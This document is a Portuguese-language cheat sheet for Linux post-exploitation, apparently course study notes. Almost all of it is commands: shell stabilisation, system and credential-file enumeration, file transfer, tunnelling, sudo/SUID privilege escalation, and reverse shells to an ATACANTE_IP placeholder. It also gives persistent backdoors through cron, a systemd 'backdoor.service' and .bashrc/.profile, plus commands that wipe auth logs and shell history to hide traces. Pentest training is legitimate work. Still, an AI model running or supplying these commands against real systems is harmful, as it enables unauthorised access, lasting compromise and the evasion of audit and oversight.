
## 1. Estabelecimento de Shell Estável

### 1.1 Melhorar Shell Básica
```bash
# Python para shell interativa
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Verificar se python está disponível
which python
which python3

# Exemplo específico do curso
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

#Exemplo se nao existir python no alvo
[[script -qc /bin/bash /dev/null]]
awk 'BEGIN {system("/bin/bash")}'

#PERL para shell interativa
perl -e 'exec "/bin/bash"'

#PHP para shell interativa
php -r 'system("/bin/bash");'
```

Exemplo completo:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
APERTAR CTRL + Z 
stty raw -echo;fg # ENTER x2
stty rows 38 columns 116

```
### 1.2 Configurar TTY
```bash
# serve para interagir com os programa como nano
# Configurar variáveis de ambiente
export TERM=xterm
export SHELL=/bin/bash

# Configurar stty
stty raw -echo
fg
reset
```

### 1.3 Shell Reversa com Netcat
https://www.revshells.com/
```bash
# No atacante
nc -lvp 4444

# No alvo
bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1
```

## 2. Enumeração Inicial do Sistema

### 2.1 Informações Básicas
```bash
# Usuário atual
whoami
id

# Diretório atual
pwd

# Hostname
hostname

# Sistema operacional
uname -a
cat /etc/issue
cat /etc/*-release

# ler arquivos de histórico do bash e do sh e zsh
cat .bash_history
cat .sh_history
cat .zsh_history
```

### 2.2 Informações de Rede
```bash
# Interfaces de rede
ip a
ifconfig

# Roteamento
route
ip route

# Conexões de rede
netstat -an
ss -tulpn

# ARP table
arp -a
ip neigh
```

### 2.3 Processos e Serviços
```bash
# Processos em execução
ps aux
ps -ef

# Serviços em execução
systemctl list-units --type=service --state=running
service --status-all

# Cron jobs
cat /etc/crontab
ls /etc/cron.hourly
ls /etc/cron.daily
ls /etc/cron.weekly
ls /etc/cron.monthly

# Comandos interessantes para enumerar o HOST (exemplo do curso)
id
pwd
cat /etc/passwd
hostname
uname -a
cat /etc/issue
cat /etc/*-release
dpkg -l # ver se alguma versao de algum software permite escalação
ip a
route
netstat -nltp
ps -aux
cat /etc/crontab
ls /etc/cron.hourly
ls /etc/cron.daily
ls /etc/cron.weekly
ls /etc/cron.monthly

# Verificando sessoes tmux abertas
tmux list-sessions
tmux attach-session -t 0
```

## 3. Enumeração de Usuários e Grupos

### 3.1 Usuários do Sistema
```bash
# Listar usuários
cat /etc/passwd
getent passwd

# Usuários com shell
cat /etc/passwd | grep -v nologin | grep -v false

# Usuários logados
who
w
last
```

### 3.2 Grupos
```bash
# Listar grupos
cat /etc/group
getent group

# Grupos do usuário atual
groups
id
```

### 3.3 Histórico de Login
```bash
# Últimos logins
last
lastlog

# Tentativas de login
grep "Failed password" /var/log/auth.log
grep "Invalid user" /var/log/auth.log
```

## 3.4 Usar Responder
Testar o responder sempre!!!

```bash
./Responder -I eth0
```
## 4. Enumeração de Arquivos e Permissões

### 4.1 Arquivos com Permissões Especiais
```bash
# Arquivos SUID
find / -perm -u=s -type f 2>/dev/null

# Arquivos SGID
find / -perm -g=s -type f 2>/dev/null

# Arquivos com permissões 777
find / -perm 777 -type f 2>/dev/null

# Arquivos com permissões 666 -rw-rw-rw-
find / -perm 666 -type f 2>/dev/null

# Exemplos específicos do curso
# Encontrando diretórios que temos permissão de escrita
find / -writable -type d 2>/dev/null

# Encontrando arquivos com suid ativo
find / -perm -u=s -type f 2>/dev/null

# SGID - nivel de grupos
find / -perm -g=s -type f 2>/dev/null

# Se encontrar algum binário, olhar no site abaixo de tem como usar como bypass
# https://gtfobins.github.io/

# Arquivos com permissões totais (se editável e executável como root, ja da pra escalar)
find / -perm 777 -type f 2>/dev/null
```

### 4.2 Diretórios com Permissão de Escrita
```bash
# Diretórios graváveis
find / -writable -type d 2>/dev/null

# Diretórios graváveis pelo usuário atual
find / -writable -type d -user $(whoami) 2>/dev/null
```

### 4.3 Arquivos de Configuração
```bash
# Arquivos de configuração
find /etc -name "*.conf" -type f 2>/dev/null
find /etc -name "*.cfg" -type f 2>/dev/null
find /etc -name "*.ini" -type f 2>/dev/null
```

## 5. Enumeração de Capabilities

### 5.1 Verificar Capabilities
```bash
# Listar capabilities
getcap -r / 2>/dev/null

# Verificar capabilities específicas
getcap /usr/bin/ping
getcap /usr/bin/nmap

# Exemplo específico do curso
# Verificando capabilities
getcap -r / 2>/dev/null
```

### 5.2 Capabilities Comuns
```bash
# Capabilities perigosas
getcap -r / 2>/dev/null | grep -E "(cap_setuid|cap_setgid|cap_sys_admin)"
```

## 6. Enumeração de Sudo

### 6.1 Verificar Sudo
```bash
# Comandos sudo permitidos
sudo -l

# Verificar sudoers
cat /etc/sudoers
ls /etc/sudoers.d/

# Exemplo específico do curso
# Listando executáveis que quando rodado com o sudo viram root
sudo -l
```

### 6.2 Exploração de Sudo
```bash
# Se sudo -l mostrar comandos específicos
sudo COMMAND

# Verificar se pode executar como root
sudo su -
```

## 7. Enumeração de Kernel

### 7.1 Informações do Kernel
```bash
# Versão do kernel
uname -r
cat /proc/version

# Módulos carregados
lsmod
cat /proc/modules

# Informações do sistema
cat /proc/cpuinfo
cat /proc/meminfo
```

### 7.2 Vulnerabilidades do Kernel
```bash
# Verificar vulnerabilidades conhecidas
cat /proc/version
uname -a
lsb_realease -a

# Verificar se há exploits disponíveis
# Pesquisar CVE baseado na versão
```

## 8. Enumeração de Dispositivos

### 8.1 Dispositivos de Hardware
```bash
# Dispositivos USB
lsusb

# Dispositivos PCI
lspci

# Dispositivos de bloco
lsblk
df -h
```

### 8.2 Dispositivos de Rede
```bash
# Interfaces de rede
ip link show
ifconfig -a

# Dispositivos de rede
cat /proc/net/dev
```

## 9. Enumeração de Logs

### 9.1 Logs do Sistema
```bash
# Logs principais
ls /var/log/

# Logs de autenticação
cat /var/log/auth.log
cat /var/log/secure

# Logs do sistema
cat /var/log/syslog
cat /var/log/messages
```

### 9.2 Logs de Aplicação
```bash
# Logs web
cat /var/log/apache2/access.log
cat /var/log/nginx/access.log

# Logs de banco de dados
cat /var/log/mysql/error.log
cat /var/log/postgresql/postgresql.log
```

## 10. Transferência de Arquivos

### 10.1 Servidor HTTP Python
```bash
# Iniciar servidor HTTP
python3 -m http.server 8080

# Baixar arquivo
wget http://ATACANTE_IP:8080/arquivo.txt
curl http://ATACANTE_IP:8080/arquivo.txt -o arquivo.txt

# Exemplo específico do curso
python3 http.server 8080
```

### 10.2 Transferência com Netcat
```bash
# No atacante (enviar)
nc -lvp 4444 < arquivo.txt

# No alvo (receber)
nc ATACANTE_IP 4444 > arquivo.txt
```

### 10.3 Transferência com Base64
```bash
# Codificar arquivo
base64 arquivo.txt

# Decodificar arquivo
echo "BASE64_CONTENT" | base64 -d > arquivo.txt
```

### 10.4 Transferência com Técnica HEX
```bash
# Comprimir o arquivo executável windows que queremos enviar com o upx
upx -9 arquivo.exe

# Depois gerar o txt
# -p para powershell, e -b para cmd
exe2hex -x arquivo.exe -p plink.txt
cat plink.txt

# Copiar para o clipboard o txt e colar no shell ele vai montar o arquivo novamente no alvo
```

### 10.5 Transferência com Técnica PDF
```bash
# Caso não consigamos usar wget, ou qualquer ferramenta no servidor para baixar arquivos
echo "%PDF-1.3" > header
cat header executavel > executavel.pdf

# Extraindo, +2 diz ao tail para ler arquivo a partir da segunda linha
tail -n +2 executavel.pdf > executavel
```

## 11. Tunelamento

### 11.1 Tunelamento com Socat
```bash
# Ao acessar um host e verificar se tem algum serviço rodando (netstat -nlpt) que só pode ser acessado localmente
# Rodar no servidor alvo, para abrir a porta 22 e enviar para 8443 da maquina do atacante
socat TCP4:IP-PENTESTER:8443 TCP4:127.0.0.1:22

# Recebendo a conexão na maquina do pentester
# Recebendo a conexão na 8443 e abrindo a 2222 para ser usada localmente pelo cliente ssh
socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr
```

### 11.2 Tunelamento com SSH
```bash
# Da pra fazer isso com ssh também
# Para isso precisamos ter acesso via ssh ao servidor alvo
ssh user@IP -L PORTALOCAL:127.0.0.1:PORTASERVICO
# O 127.0.0.1 é o ip loopback do servidor mas poderia passar outro ip que o servidor tivesse alcançe
```

### 11.3 Tunelamento com [[04.03 - Pivotagem e tunelamento|Ligolo]]
## 12. Escalação de Privilégios

### 12.1 Verificar Privilégios Atuais
```bash
# Verificar usuário atual
whoami
id

# Verificar grupos
groups

# Verificar se é root
if [ "$(id -u)" -eq 0 ]; then
    echo "Já é root!"
else
    echo "Precisa escalar privilégios"
fi
```

### 11.2 Exploração de SUID
```bash
# Listar arquivos SUID
find / -perm -u=s -type f 2>/dev/null

# Verificar se pode ser explorado
# Consultar https://gtfobins.github.io/
```

### 11.3 Exploração de Sudo
```bash
# Verificar comandos sudo
sudo -l

# Se encontrar comandos específicos, explorar
# Exemplo: sudo /usr/bin/find
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
```

### 11.4 Exploração de Capabilities
```bash
# Verificar capabilities
getcap -r / 2>/dev/null

# Se encontrar capabilities perigosas, explorar
# Exemplo: cap_setuid
```

## 12. Persistência

### 12.1 Cron Jobs
```bash
# Adicionar cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1'" | crontab -

# Verificar cron jobs
crontab -l
```

### 12.2 Serviços
```bash
# Criar serviço
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Habilitar serviço
systemctl enable backdoor.service
systemctl start backdoor.service
```

### 12.3 Arquivos de Inicialização
```bash
# Adicionar ao .bashrc
echo "bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1" >> ~/.bashrc

# Adicionar ao .profile
echo "bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1" >> ~/.profile
```

## 13. Limpeza de Rastros

### 13.1 Limpar Logs
```bash
# Limpar logs de autenticação
echo "" > /var/log/auth.log
echo "" > /var/log/secure

# Limpar logs do sistema
echo "" > /var/log/syslog
echo "" > /var/log/messages
```

### 13.2 Limpar Histórico
```bash
# Limpar histórico do bash
history -c
echo "" > ~/.bash_history

# Limpar histórico do zsh
echo "" > ~/.zsh_history
```

### 13.3 Remover Arquivos
```bash
# Remover arquivos temporários
rm -rf /tmp/*
rm -rf /var/tmp/*

# Remover arquivos de payload
rm -f payload.exe
rm -f shell.php
```

## 14. Enumeração de Rede Interna

### 14.1 Descoberta de Hosts
```bash
# Ping sweep
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes" & done

# ARP scan
arp -a
ip neigh

# rodando do kali
arping -c 1 TARGET
```

### 14.2 Varredura de Portas
```bash
# Varredura básica
nmap -sn 192.168.1.0/24

# Varredura de portas
nmap -p 80,443,22,21,25,53,110,143,993,995 192.168.1.0/24
```

### 14.3 Pivoting
```bash
# Configurar rota
route add -net 192.168.2.0/24 gw 192.168.1.1

# Verificar rotas
route -n
ip route
```

## 15. Checklist de Validação

- [ ] Shell estável estabelecida
- [ ] Informações básicas coletadas
- [ ] Usuários e grupos enumerados
- [ ] Arquivos com permissões especiais identificados
- [ ] Capabilities verificadas
- [ ] Sudo configurado verificado
- [ ] Kernel enumerado
- [ ] Dispositivos identificados
- [ ] Logs analisados
- [ ] Transferência de arquivos testada
- [ ] Escalação de privilégios tentada
- [ ] Persistência estabelecida
- [ ] Rastros limpos
- [ ] Rede interna enumerada
- [ ] Pivoting configurado
- [ ] Resultados documentados

## 16. Ferramentas Automatizadas

### 16.1 LinPEAS
```bash
# Baixar LinPEAS
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Executar LinPEAS
chmod +x linpeas.sh
./linpeas.sh

# Referências do curso
# https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
# https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

### 16.2 LinEnum
```bash
# Baixar LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Executar LinEnum
chmod +x LinEnum.sh
./LinEnum.sh
```

### 16.3 Linux Exploit Suggester
```bash
# Baixar Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# Executar
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

## 17. Dicas Importantes

1. **Sempre melhorar a shell** primeiro
2. **Enumeração sistemática** é essencial
3. **Verificar permissões** cuidadosamente
4. **Usar ferramentas automatizadas** como complemento
5. **Documentar descobertas** para escalação
6. **Testar exploits** antes de usar
7. **Limpar rastros** após exploração
8. **Estabelecer persistência** quando necessário
